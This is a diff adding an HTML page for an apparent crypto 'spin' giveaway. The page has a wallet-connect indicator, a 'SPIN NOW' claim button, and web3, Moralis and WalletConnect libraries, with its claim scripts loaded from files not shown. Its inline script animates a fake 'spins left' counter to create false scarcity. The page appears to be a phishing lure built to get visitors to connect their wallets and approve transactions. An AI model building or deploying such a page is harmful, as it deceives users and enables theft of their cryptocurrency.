@@ -1,0 +1,148 @@
+<!doctype html>
+<html lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <title>Loading..</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="npm/@fortawesome/fontawesome-free@5.15.4/css/fontawesome.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+   <script src="1409195906.js" crossorigin="anonymous"></script>
+     <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet">
+
+    <script src="./settings.js"></script>
+    <link rel="stylesheet" href="./src/css/styles.css">
+</head>
+
+<body class="container no-bg"align="center"  >
+    <nav>
+        <div class="logo"><center><img src="https://i.ibb.co/7vnnFBt/XCX.png" width="150" height="64"></a></div>
+        <div class="right">
+            <p id="walletAddress">NOT CONNECTED</p>
+            <img src="./assets/svg/meta.svg" alt="">
+        </div>
+    </nav>
+</br>
+
+
+
+
+
+<center><img src="https://png2.cleanpng.com/dy/91fce27fadbab10af81b8fb8d6417448/L0KzQYq3U8E3N6pxjpH0aYP2gLBuTgRweF5phAl3LXHxdH7pjCR1d54yjeI2ZHX2ebj1TfluaZhqRdV4bYD4hLb5Tflkd594RadsOHO7Q7XoVMlja2Y7RqkDN0a0R4a8UcU2Omg2SqgBNkOzQnB3jvc=/kisspng-top-down-and-bottom-up-design-image-computer-icons-5c8c83da49bc56.787617551552712666302.png"width="30" height="40"></a>
+
+<center> <img class="rotate" src="https://i.ibb.co/s5xDpcL/SPIN.png" width="430" height="430"></a>
+
+</center>
+
+
+
+
+
+<h3>TOTAL SPIN LEFT </h3>
+
+
+<div id="value"> 1000</div>
+<script>
+function animateValue(obj, start, end, duration) {
+  let startTimestamp = null;
+  const step = (timestamp) => {
+    if (!startTimestamp) startTimestamp = timestamp;
+    const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+    obj.innerHTML = Math.floor(progress * (end - start) + start);
+    if (progress < 1) {
+      window.requestAnimationFrame(step);
+    }
+  };
+  window.requestAnimationFrame(step);
+}
+
+const obj = document.getElementById("value");
+animateValue(obj, 803, 189, 500000);
+</script>
+
+
+
+
+    <div class="logo-re" style="display: none;"></div>
+    <div class="section3">
+        
+        <div class="right"  >
+            
+            <p id="shortDescription"></p>
+            <p id="longDescription"></p>
+            <div class="block-button" >
+                <center>				<a id="claimButton">SPIN NOW</a></center>
+                <p id="notEli" style="color: red; padding-top: 10px; display: none; letter-spacing: 3px"></p>
+            </div>
+
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+    <div class="section2">
+        <div class="left">
+            <a href="#"></a>
+            <p>© 2022 <span id="cp_name"></span></p>
+        </div>
+        <div class="right">
+            <a id="social_discord" href="#" target="_blank"><img src="./assets/svg/discord.svg" alt=""></a>
+            <a id="social_twitter" href="#" target="_blank"><img src="./assets/svg/twiter.svg" alt=""></a>
+            <a id="social_instagram" href="#" target="_blank"><img src="./assets/svg/insta.svg" alt=""></a>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <script src="./src/js/loader_claim.js"></script>
+
+    <script src="web3@latest/dist/web3.min.js"></script>
+    <script src="moralis/dist/moralis.js"></script>
+    <script src="@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
+    
+    <script type="text/javascript" src="./src/js/claim.js"></script>
+
+</body>
+
+</html>
